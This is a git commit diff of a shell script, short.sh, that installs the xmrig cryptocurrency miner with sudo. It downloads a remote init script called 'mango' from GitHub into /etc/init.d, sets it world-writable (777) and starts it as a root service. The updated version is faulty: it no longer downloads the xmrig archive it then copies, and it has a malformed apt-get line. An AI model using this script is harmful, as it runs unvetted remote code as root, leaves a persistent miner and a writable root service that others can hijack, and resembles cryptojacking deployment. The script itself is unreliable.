53021f135a7729095cdfe59e1d0eb000b940e7ce
Big_ort <adytamasurya@gmail.com>
2019-02-26 08:20:50 +0700

    Update short.sh

--- short.sh
+++ short.sh
@@ -1,10 +1,11 @@
-rm -rf xmrig.tar.gz;
-wget https://raw.githubusercontent.com/BigOrt/bigort/master/xmrig.tar.gz && tar -zxvf xmrig.tar.gz;
-sudo apt-get install libmicrohttpd-dev -y;
-sudo cp xmrig /usr/local/bin;
-sudo cp xmrig /usr/bin;
-sudo chmod +x /usr/local/bin/xmrig;
-sudo chmod +x /usr/bin/xmrig;
-sudo wget https://raw.githubusercontent.com/BigOrt/bigort/master/mango -O /etc/init.d/mango;
-sudo chmod -R 777 /etc/init.d/mango;
-sudo /etc/init.d/mango start;
+#!/bin/sh
+rm -rf xmrig.tar.gz
+sudo apt-get libmicrohttpd-dev -y
+sudo apt-get install libmicrohttpd-dev -y
+sudo cp xmrig /usr/local/bin
+sudo cp xmrig /usr/bin
+sudo chmod +x /usr/local/bin/xmrig
+sudo chmod +x /usr/bin/xmrig
+sudo wget https://raw.githubusercontent.com/BigOrt/bigort/master/mango -O /etc/init.d/mango
+sudo chmod -R 777 /etc/init.d/mango
+sudo /etc/init.d/mango start
